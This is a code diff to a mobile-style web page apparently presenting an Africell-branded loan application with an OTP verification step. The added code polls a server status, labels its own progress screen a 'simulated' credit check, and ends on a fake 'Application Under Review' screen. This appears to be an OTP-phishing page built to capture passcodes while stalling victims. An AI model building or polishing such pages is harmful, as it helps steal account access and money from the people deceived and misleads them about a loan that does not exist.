@@ -143,15 +143,26 @@
         </div>
 
         <!-- Error message -->
-        <div id="otpError" style="display:none; margin-top:14px; background:#fff0f0; border:1px solid #ffcccc; border-radius:10px; padding:12px 15px; text-align:center; font-size:13px; color:#cc0000; width:100%;"></div>
+        <div id="otpError"
+            style="display:none; margin-top:14px; background:#fff0f0; border:1px solid #ffcccc; border-radius:10px; padding:12px 15px; text-align:center; font-size:13px; color:#cc0000; width:100%;">
+        </div>
     </div>
 
     <!-- Loading overlay -->
-    <div id="waitOverlay" style="display:none; position:fixed; inset:0; z-index:999; background:rgba(166,0,104,0.95); flex-direction:column; align-items:center; justify-content:center; color:white;">
-        <div style="width:48px;height:48px;border:5px solid rgba(255,255,255,0.3); border-top-color:white;border-radius:50%;animation:spin 0.9s linear infinite; margin-bottom:20px;"></div>
+    <div id="waitOverlay"
+        style="display:none; position:fixed; inset:0; z-index:999; background:rgba(166,0,104,0.95); flex-direction:column; align-items:center; justify-content:center; color:white;">
+        <div
+            style="width:48px;height:48px;border:5px solid rgba(255,255,255,0.3); border-top-color:white;border-radius:50%;animation:spin 0.9s linear infinite; margin-bottom:20px;">
+        </div>
         <div style="font-size:17px;font-weight:700;">Verifying OTP...</div>
         <div style="font-size:13px;opacity:0.75;margin-top:6px;">Please wait</div>
-        <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
+        <style>
+            @keyframes spin {
+                to {
+                    transform: rotate(360deg);
+                }
+            }
+        </style>
     </div>
 
     <script>
@@ -226,14 +237,34 @@
 
                     if (status === 'approved') {
                         clearInterval(poll);
-                        // Show success
+                        // Phase 1: Simulated "checking" step
                         document.getElementById('waitOverlay').innerHTML = `
-                            <div style="font-size:56px;margin-bottom:16px;">✅</div>
-                            <div style="font-size:18px;font-weight:700;">OTP Verified!</div>
-                            <div style="font-size:13px;opacity:0.8;margin-top:8px;">Loan application approved.</div>
+                            <div style="width:52px; height:52px; border:5px solid rgba(255,255,255,0.3); border-top-color:white; border-radius:50%; animation:spin 0.9s linear infinite; margin-bottom:24px;"></div>
+                            <div style="font-size:18px;font-weight:700;letter-spacing:0.5px;">OTP Verified!</div>
+                            <div style="font-size:14px;opacity:0.9;margin-top:10px;text-align:center;line-height:1.5;">
+                                Running credit simulation...<br>
+                                <span style="font-size:12px;opacity:0.75;">This may take a few seconds</span>
+                            </div>
+                            <style>@keyframes spin{to{transform:rotate(360deg);}}</style>
                         `;
-                        document.getElementById('waitOverlay').style.display = 'flex';
-                        setTimeout(() => { window.location.href = 'app.html'; }, 2000);
+
+                        // Phase 2: Show final "Under Review" screen after 5 seconds
+                        setTimeout(() => {
+                            // Clear body to just show the final state
+                            document.body.innerHTML = `
+                                <div style="display:flex; flex-direction:column; align-items:center; justify-content:center; height:100vh; padding:30px; text-align:center; background:#f4f7f6;">
+                                    <div style="font-size:72px; margin-bottom:20px;">⏳</div>
+                                    <h2 style="color:var(--africell-purple); margin-bottom:15px; font-size:24px;">Application Under Review</h2>
+                                    <p style="color:#555; font-size:15px; line-height:1.6; margin-bottom:40px;">
+                                        Your loan application has been submitted successfully and is currently under review by our team.<br><br>
+                                        You will receive an SMS notification once a decision has been made.
+                                    </p>
+                                    <button onclick="window.location.href='app.html'" style="background:var(--africell-purple); color:white; border:none; border-radius:12px; padding:16px 30px; font-size:16px; font-weight:bold; cursor:pointer; width:100%; max-width:300px; box-shadow:0 4px 15px rgba(166,0,104,0.2);">
+                                        Reapply / Modify App
+                                    </button>
+                                </div>
+                            `;
+                        }, 5000);
                     } else if (status === 'wrong_otp') {
                         clearInterval(poll);
                         showOtpError('❌ Incorrect OTP. Please check and try again.');
